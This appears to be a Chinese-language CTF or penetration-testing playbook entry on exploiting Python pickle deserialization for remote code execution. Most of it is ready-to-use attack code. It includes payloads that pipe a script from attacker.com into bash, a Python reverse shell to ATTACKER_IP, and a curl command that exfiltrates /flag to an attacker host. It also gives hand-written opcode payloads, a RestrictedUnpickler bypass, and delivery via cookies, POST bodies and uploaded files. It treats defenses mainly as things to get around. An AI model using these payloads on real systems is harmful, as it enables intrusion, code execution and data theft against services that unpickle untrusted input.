---
category: web
tags: [deserialization, pickle, python, rce, unpickle, 反序列化, pickle注入]
triggers: [pickle, unpickle, deserialization, python deserialize, base64 decode, pickle.loads, 反序列化, __reduce__]
related: [ssti, sqli]
---

# Python Pickle 反序列化

## 什么时候用

程序对不可信数据调用了 `pickle.loads()` / `pickle.load()`。常见于 Python Web 应用的 session、缓存、消息队列、文件上传等场景。

## 前提条件

- 存在 `pickle.loads(user_controlled_data)` 调用
- 数据通常经过 base64 编码传输
- **无需其他条件**——pickle 反序列化本身就等于任意代码执行

## 核心原理

Python `pickle` 在反序列化时会调用对象的 `__reduce__` 方法，该方法返回一个 `(callable, args)` 元组。反序列化时 Python 会执行 `callable(*args)`。

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# 当目标执行 pickle.loads(payload) 时 → os.system('id')
```

## 攻击步骤

### 1. 确认 pickle 反序列化入口

常见位置：
- **Cookie/Session**：Flask 默认用 `itsdangerous`（签名但非加密），但自定义 session 可能直接 pickle
- **Redis/Memcached**：缓存的序列化格式
- **API 参数**：base64 编码的 POST body
- **文件上传**：`.pkl` / `.pickle` 文件
- **消息队列**：Celery task 参数

**识别方法**：base64 解码后，pickle 数据以 `\x80\x03` 或 `\x80\x04` 或 `\x80\x05` 开头（分别对应 pickle protocol 3/4/5）。

### 2. 构造 payload

**基本 RCE**：
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())
```

**反弹 shell**：
```python
class RevShell:
    def __reduce__(self):
        import os
        return (os.system, (
            'python3 -c \'import socket,os,pty;s=socket.socket();'
            's.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);'
            'os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'',
        ))
```

**用 subprocess 带回显**：
```python
class Exploit:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['cat', '/flag'],))
```

**执行多条命令**：
```python
class Multi:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('id; cat /flag').read()",))
```

### 3. 发送 payload

根据入口不同：

```python
# Cookie
import requests
cookies = {"session": payload.decode()}
r = requests.get(url, cookies=cookies)

# POST body
r = requests.post(url, data={"data": payload.decode()})

# 文件上传
with open("evil.pkl", "wb") as f:
    f.write(pickle.dumps(RCE()))
```

## 高级技巧

### pickle opcode 手写（绕过限制）

如果 `__reduce__` 被检测，可以直接用 pickle 虚拟机指令：

```python
import pickle

# 手写 pickle bytecode: 等价于 os.system('id')
payload = b'\x80\x03cos\nsystem\nX\x02\x00\x00\x00idR.'

# 解释：
# \x80\x03  = protocol 3
# c         = GLOBAL: 导入 os.system
# X\x02...  = SHORT_BINUNICODE: 'id'
# R         = REDUCE: 调用栈顶函数
# .         = STOP
```

### 绕过 RestrictedUnpickler

如果目标用了自定义 `Unpickler` 限制可导入的模块：

```python
# 常见限制：只允许 __builtin__ 模块
# 绕过：通过 __builtin__.getattr 间接访问
payload = b"c__builtin__\ngetattr\n(c__builtin__\n__import__\nX\x02\x00\x00\x00ostRX\x06\x00\x00\x00systemtR."
```

### pickle 结合 `__setstate__` / `__getstate__`

```python
class Exploit:
    def __getstate__(self):
        return {"cmd": "id"}
    
    def __setstate__(self, state):
        os.system(state["cmd"])
```

## 常见坑

- **pickle protocol 版本**：不同 Python 版本默认 protocol 不同。用 `pickle.dumps(obj, protocol=2)` 指定兼容版本。
- **目标 Python 版本**：如果目标是 Python 2，用 `cPickle` 或 protocol 0/1/2。
- **无回显**：如果看不到执行结果，用带外方式——`curl http://attacker/?data=$(cat /flag | base64)` 或反弹 shell。
- **JSON 传输**：pickle payload 是二进制，通过 HTTP 传输一般要 base64 编码。
- **Flask session**：Flask 默认 session 是签名的（需要 SECRET_KEY 才能伪造），不是单纯的 pickle。如果拿到了 SECRET_KEY，可以用 `flask-unsign` 工具。

## 防御方式（了解有助于绕过）

| 防御 | 绕过可能性 |
|------|-----------|
| `pickle.loads` → `json.loads` | 根治，无法绕过 |
| 自定义 `Unpickler.find_class` 白名单 | 可能通过间接导入绕过 |
| `hmac` 签名验证 | 需要拿到 secret key |
| `RestrictedPython` | 已知多个逃逸（CVE-2023-41039, CVE-2023-37271）|

## 相关技术

- [[ssti]] — SSTI 拿到代码执行后可以注入 pickle 到 session/缓存
- [[sqli]] — 某些数据库存储了 pickle 序列化的 blob
